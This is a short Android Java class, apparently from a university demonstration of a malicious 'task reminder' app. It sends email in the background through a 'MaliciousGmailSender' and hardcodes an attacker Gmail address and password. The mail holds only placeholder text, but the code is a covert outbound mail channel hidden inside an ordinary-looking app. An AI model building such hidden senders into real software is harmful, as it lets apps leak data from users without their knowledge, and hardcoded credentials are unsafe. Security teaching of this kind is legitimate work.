package edu.cmu.malicioustaskreminder;

import android.os.AsyncTask;
import android.util.Log;

public class SendMailTask extends AsyncTask<Object, Void, Void> {

	@Override
	protected Void doInBackground(Object... params) {
		try {   
            MaliciousGmailSender sender = new MaliciousGmailSender("malicousattacker@gmail.com", "Qwertyuiop123");
            sender.sendMail("This is Subject",   
                    "This is Body",   
                    "malicousattacker@gmail.com",   
                    "illuminati.assassin@gmail.com");   
        } catch (Exception e) {   
            Log.e("SendMail", e.getMessage(), e);   
        } 
		return (Void)null;
		
	}

}
